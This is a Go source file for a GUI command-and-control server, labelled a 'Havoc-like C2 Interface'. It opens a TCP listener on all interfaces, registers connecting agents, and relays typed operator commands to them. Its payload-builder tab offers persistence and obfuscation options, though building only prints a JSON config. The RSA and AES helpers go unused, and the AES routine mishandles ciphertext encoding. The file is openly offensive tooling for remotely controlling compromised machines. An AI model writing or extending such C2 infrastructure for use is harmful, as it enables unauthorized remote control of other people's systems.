package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/widget"
)

const rsaKeySize = 2048

// Structs for listeners, agents, and payloads
type Listener struct {
	Type   string
	IP     string
	Port   string
	Status string
}

type Agent struct {
	ID   string
	IP   string
	OS   string
	Time string
}

type PayloadConfig struct {
	Format       string
	Encryption   string
	Persistence  bool
	Obfuscation  bool
	CustomConfig string
}

var listeners []Listener
var agents []Agent
var rsaPrivateKey *rsa.PrivateKey
var agentChannel = make(chan string) // To send messages/commands to agents

// Helper functions for encryption
func generateRSAKey() {
	key, err := rsa.GenerateKey(rand.Reader, rsaKeySize)
	if err != nil {
		fmt.Println("Failed to generate RSA key:", err)
		return
	}
	rsaPrivateKey = key
}

func encryptRSA(data []byte, publicKey *rsa.PublicKey) ([]byte, error) {
	encryptedData, err := rsa.EncryptPKCS1v15(rand.Reader, publicKey, data)
	if err != nil {
		return nil, err
	}
	return encryptedData, nil
}

func decryptRSA(data []byte) ([]byte, error) {
	decryptedData, err := rsa.DecryptPKCS1v15(rand.Reader, rsaPrivateKey, data)
	if err != nil {
		return nil, err
	}
	return decryptedData, nil
}

func encryptAES(data []byte, key []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, aesGCM.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}
	ciphertext := aesGCM.Seal(nonce, nonce, data, nil)
	return fmt.Sprintf("%s", ciphertext), nil
}

func decryptAES(data string, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	decodedData := []byte(data)
	nonceSize := aesGCM.NonceSize()
	nonce, ciphertext := decodedData[:nonceSize], decodedData[nonceSize:]
	plaintext, err := aesGCM.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}
	return plaintext, nil
}

// UI components
func buildUI() fyne.Window {
	application := app.New()
	window := application.NewWindow("Havoc-like C2 Interface")
	window.Resize(fyne.NewSize(800, 600))

	// Dashboard
	dashboard := widget.NewLabel("Welcome to the C2 Dashboard")

	// Listeners Management
	listenerTable := widget.NewTable(
		func() (int, int) { return len(listeners), 4 },
		func() fyne.CanvasObject { return widget.NewLabel("") },
		func(id widget.TableCellID, obj fyne.CanvasObject) {
			switch id.Col {
			case 0:
				obj.(*widget.Label).SetText(listeners[id.Row].Type)
			case 1:
				obj.(*widget.Label).SetText(listeners[id.Row].IP)
			case 2:
				obj.(*widget.Label).SetText(listeners[id.Row].Port)
			case 3:
				obj.(*widget.Label).SetText(listeners[id.Row].Status)
			}
		})

	// Payload Builder
	formatEntry := widget.NewEntry()
	encryptionEntry := widget.NewEntry()
	buildPayloadButton := widget.NewButton("Build Payload", func() {
		config := PayloadConfig{
			Format:     formatEntry.Text,
			Encryption: encryptionEntry.Text,
		}
		payload, _ := json.Marshal(config)
		fmt.Println("Payload built:", string(payload))
	})

	// Agent Management
	agentTable := widget.NewTable(
		func() (int, int) { return len(agents), 4 },
		func() fyne.CanvasObject { return widget.NewLabel("") },
		func(id widget.TableCellID, obj fyne.CanvasObject) {
			switch id.Col {
			case 0:
				obj.(*widget.Label).SetText(agents[id.Row].ID)
			case 1:
				obj.(*widget.Label).SetText(agents[id.Row].IP)
			case 2:
				obj.(*widget.Label).SetText(agents[id.Row].OS)
			case 3:
				obj.(*widget.Label).SetText(agents[id.Row].Time)
			}
		})

	// Command Input for Agent Interaction
	commandEntry := widget.NewEntry()
	sendCommandButton := widget.NewButton("Send Command", func() {
		command := commandEntry.Text
		agentChannel <- command // Send command to agent
	})

	// Tabs
	tabs := container.NewAppTabs(
		container.NewTabItem("Dashboard", dashboard),
		container.NewTabItem("Listeners", listenerTable),
		container.NewTabItem("Payload Builder", container.NewVBox(formatEntry, encryptionEntry, buildPayloadButton)),
		container.NewTabItem("Agents", agentTable),
		container.NewTabItem("Command Input", container.NewVBox(commandEntry, sendCommandButton)),
	)

	window.SetContent(tabs)
	return window
}

// Listener function
func startListener(ip, port string) {
	listener, err := net.Listen("tcp", ip+":"+port)
	if err != nil {
		fmt.Println("Failed to start listener:", err)
		return
	}
	fmt.Println("Listener started on", ip+":"+port)
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Failed to accept connection:", err)
			continue
		}
		go handleConnection(conn)
	}
}

// Handle agent connection
func handleConnection(conn net.Conn) {
	defer conn.Close()

	// Register new agent
	agentID := fmt.Sprintf("%s:%d", conn.RemoteAddr().String(), time.Now().Unix())
	agents = append(agents, Agent{
		ID:   agentID,
		IP:   conn.RemoteAddr().String(),
		OS:   "Unknown",
		Time: time.Now().Format(time.RFC3339),
	})

	// Listen for incoming commands and handle them
	for {
		buffer := make([]byte, 1024)
		n, err := conn.Read(buffer)
		if err != nil {
			fmt.Println("Error reading from connection:", err)
			return
		}
		// Decrypt and process incoming data from agent
		command := string(buffer[:n])
		fmt.Println("Received command from agent:", command)

		// Wait for command from the UI
		select {
		case uiCommand := <-agentChannel:
			fmt.Println("Sending command to agent:", uiCommand)
			conn.Write([]byte(uiCommand))
		default:
			// No command sent, agent keeps listening
		}
	}
}

func main() {
	generateRSAKey()
	window := buildUI()
	go startListener("0.0.0.0", "8080")
	window.ShowAndRun()
}
